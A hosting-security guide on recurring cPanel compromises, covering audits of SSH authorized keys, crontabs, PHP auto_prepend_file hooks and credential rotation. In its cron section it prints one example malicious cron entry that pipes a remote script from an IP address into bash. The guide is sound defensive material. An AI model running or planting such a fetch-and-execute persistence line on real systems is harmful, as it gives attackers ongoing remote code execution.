cPanel Account Keeps Getting Hacked? Check SSH, Crons & PHP Files

By LicenBase Team Published October 20, 2026 6 min read

Few experiences are more exasperating for website owners and system administrators than cleaning a compromised cPanel account, only to find the exact same malware, spam redirects, or rogue webshells reappear 48 hours later. When an account suffers from recurring reinfections, it is rarely due to bad luck. It means the root cause was not resolved, or the attacker established persistent administrative footholds that survive superficial file scans. In this technical guide, we examine the four primary persistence vectors used by modern attackers—compromised SSH keys, hidden crontabs, obfuscated PHP loaders, and database triggers—and how to permanently secure your cPanel environment.

1. The Mechanics of Recurring Compromises

When an attacker breaches a web application (for example, through an unpatched WordPress plugin or vulnerable theme), their primary objective is ensuring continuous access even if the site owner notices and patches the initial vulnerability. Attackers accomplish this by establishing secondary and tertiary footholds across multiple layers:

  • Operating System Layer: Installing unauthorized public keys in the account's ~/.ssh/authorized_keys to maintain direct shell access.
  • Scheduler Layer: Adding cron jobs that redownload deleted malware payloads from remote staging servers every hour.
  • PHP Configuration Layer: Utilizing .user.ini or php.ini directives like auto_prepend_file to force script execution before any web request.
  • Database Layer: Registering rogue administrator accounts or embedding malicious JavaScript inside database tables like wp_options or wp_posts.

2. Auditing SSH Authorized Keys and Shell Privileges

If SSH access is enabled for the cPanel user, an attacker with file-write permissions can easily append their public key to the account's key registry, giving them authenticated terminal access without needing the cPanel password.

Connect to the server via SSH as root and inspect the user's SSH keys:

# Inspect authorized keys for the cPanel user
cat /home/username/.ssh/authorized_keys

# Check file modification timestamp
stat /home/username/.ssh/authorized_keys

If you see unrecognized public keys, remove the entire file immediately. Unless the user specifically requires terminal access for developer workflows, disable shell access for the account completely in WHM:

# Disable SSH shell access for the user via WHM API
whmapi1 modifyacct user=username shell=/bin/noshell

This shuts down the attacker's direct terminal access channel permanently.

3. Inspecting and Clearing Hidden Crontabs

Cron jobs are the most popular reinfection vector because they execute quietly in the background without requiring active user sessions. Attackers schedule cron jobs that execute curl or wget commands to fetch fresh webshells whenever the website files are cleaned.

Inspect both the user's crontab and the system spool:

# Check user crontab
crontab -l -u username

# Inspect physical cron file in /var/spool/cron
cat /var/spool/cron/username

Look for suspicious entries executing scripts from /tmp, /dev/shm, or invoking raw IP addresses:

* * * * * curl -s http://198.51.100.22/drop.sh | bash >/dev/null 2>&1

If malicious crons are present, remove all scheduled jobs for the user:

crontab -r -u username

Additionally, check /etc/cron.deny and consider preventing untrusted cPanel accounts from scheduling crontabs entirely.

4. Hunting Stealth PHP Backdoors and Configuration Prepend Hooks

Attackers frequently hide PHP backdoors inside non-PHP files (such as logo.png.php, .ico files containing PHP tags) or exploit PHP configuration files to execute malware globally.

Check for the dangerous auto_prepend_file directive across the user document root:

grep -rnEi "(auto_prepend_file|auto_append_file)" /home/username/public_html/

If found inside .user.ini or php.ini, it points to a script that runs automatically on every incoming request. Delete the directive and the associated script.

Next, search for executable PHP files hidden inside media and upload directories:

# Find PHP files in upload folders
find /home/username/public_html/wp-content/uploads/ -type f -name "*.php*" -ls

# Search for suspicious file extensions
find /home/username/public_html -type f \( -name "*.ico" -o -name "*.png" \) -exec grep -l "<?php" {} +

Any media file that contains PHP opening tags is an obfuscated webshell and must be quarantined immediately.

5. Rotating All Credentials and Invalidation of Sessions

Once backdoors and crons are eliminated, you must invalidate all stored credentials. If an attacker stole database passwords or cPanel cookies, they can walk right back in:

  1. Reset cPanel and FTP Passwords: Change the primary cPanel password and delete all secondary FTP accounts.
  2. Rotate Database Passwords: In cPanel MySQL Management, generate a new strong password for the database user and update wp-config.php.
  3. Regenerate WordPress Security Salts: Replace all AUTH_KEY and SECURE_AUTH_KEY salts in wp-config.php to terminate all active sessions and cookies immediately.
  4. Enforce Two-Factor Authentication (2FA): Enable 2FA in cPanel and within the WordPress dashboard for all administrative users.
